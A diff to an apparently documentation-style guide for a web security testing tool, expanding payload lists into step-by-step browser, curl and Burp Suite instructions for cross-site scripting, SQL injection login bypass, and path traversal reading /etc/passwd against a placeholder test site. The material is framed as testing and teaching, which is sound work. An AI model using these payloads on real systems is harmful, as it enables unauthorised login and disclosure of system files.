@@ -176,10 +176,40 @@ http://169.254.169.254/
 Show an alert saying XSS Found
 ```
 
-**Payloads to test:**
-1. Put in "Name" field: `<script>alert("XSS Found")</script>`
-2. Put in "Email" field: `<img src=x onerror=alert("XSS Found")>`
-3. Put in "Message" field: `<svg/onload=alert("XSS Found")>`
+**Payloads generated:**
+1. `<script>alert("XSS Found")</script>`
+2. `<img src=x onerror=alert("XSS Found")>`
+3. `<svg/onload=alert("XSS Found")>`
+
+**Step-by-step testing:**
+
+**Method 1: Browser Testing**
+1. Open your test website's contact form
+2. In the "Name" field, paste: `<script>alert("XSS Found")</script>`
+3. Fill other required fields with normal data
+4. Click "Submit"
+5. ✅ **Success:** You see an alert popup saying "XSS Found"
+6. ❌ **Blocked:** Try payload #2 or #3
+
+**Method 2: cURL Testing**
+```bash
+# Test search parameter
+curl 'https://your-test-site.com/search?q=<script>alert("XSS Found")</script>'
+
+# Test with URL encoding
+curl 'https://your-test-site.com/search?q=%3Cscript%3Ealert%28%22XSS%20Found%22%29%3C%2Fscript%3E'
+
+# Test POST request
+curl -X POST https://your-test-site.com/contact \
+     -d 'name=<script>alert("XSS Found")</script>&email=test@test.com&message=test'
+```
+
+**Method 3: Browser DevTools**
+1. Open browser DevTools (F12)
+2. Go to Console tab
+3. Paste payload in input field
+4. Submit form
+5. Watch Console for XSS execution or errors
 
 ---
 
@@ -190,10 +220,43 @@ Show an alert saying XSS Found
 Bypass login as admin
 ```
 
-**Payloads to test:**
-1. Username: `admin' OR '1'='1`
-2. Username: `admin'--`
-3. Username: `' OR 1=1--`
+**Payloads generated:**
+1. `admin' OR '1'='1`
+2. `admin'--`
+3. `' OR 1=1--`
+
+**Step-by-step testing:**
+
+**Method 1: Browser Testing**
+1. Go to your test website's login page
+2. Username field: `admin' OR '1'='1`
+3. Password field: `anything`
+4. Click "Login"
+5. ✅ **Success:** You're logged in without valid password
+6. ❌ **Blocked:** Try payload #2 or #3
+
+**Method 2: cURL Testing**
+```bash
+# Test login with SQLi
+curl -X POST https://your-test-site.com/login \
+     -d "username=admin' OR '1'='1&password=test"
+
+# Test with URL encoding
+curl -X POST https://your-test-site.com/login \
+     -d "username=admin%27+OR+%271%27%3D%271&password=test"
+
+# Check response for session cookie or success message
+curl -X POST https://your-test-site.com/login \
+     -d "username=admin'--&password=test" \
+     -v  # Verbose mode to see cookies
+```
+
+**Method 3: Burp Suite**
+1. Intercept login request in Burp
+2. Find username parameter
+3. Replace with: `admin' OR '1'='1`
+4. Forward request
+5. Check response for successful authentication
 
 ---
 
@@ -204,10 +267,44 @@ Bypass login as admin
 Read file /etc/passwd
 ```
 
-**Payloads to test:**
-1. Filename: `../../../etc/passwd`
-2. Filename: `..\..\..\..\etc\passwd`
-3. URL parameter: `file=../../../etc/passwd`
+**Payloads generated:**
+1. `../../../etc/passwd`
+2. `..\..\..\..\etc\passwd`
+3. `....//....//....///etc/passwd`
+
+**Step-by-step testing:**
+
+**Method 1: Browser Testing (Download Feature)**
+1. Find a file download feature on your test site
+2. In the URL or filename parameter, enter: `../../../etc/passwd`
+3. Click "Download" or submit
+4. ✅ **Success:** You see /etc/passwd contents
+5. ❌ **Blocked:** Try payload #2 or #3
+
+**Method 2: cURL Testing**
+```bash
+# Test file download parameter
+curl 'https://your-test-site.com/download?file=../../../etc/passwd'
+
+# Test with URL encoding
+curl 'https://your-test-site.com/download?file=..%2F..%2F..%2Fetc%2Fpasswd'
+
+# Test POST request
+curl -X POST https://your-test-site.com/api/readfile \
+     -H "Content-Type: application/json" \
+     -d '{"filename": "../../../etc/passwd"}'
+
+# Save output to file
+curl 'https://your-test-site.com/download?file=../../../etc/passwd' -o output.txt
+cat output.txt  # Check if it contains /etc/passwd
+```
+
+**Method 3: File Upload Testing**
+1. Find file upload feature
+2. Create a file named: `../../../test.txt`
+3. Upload the file
+4. Try to access: `https://your-test-site.com/uploads/../../../etc/passwd`
+5. Check if path traversal worked
 
 ---
 
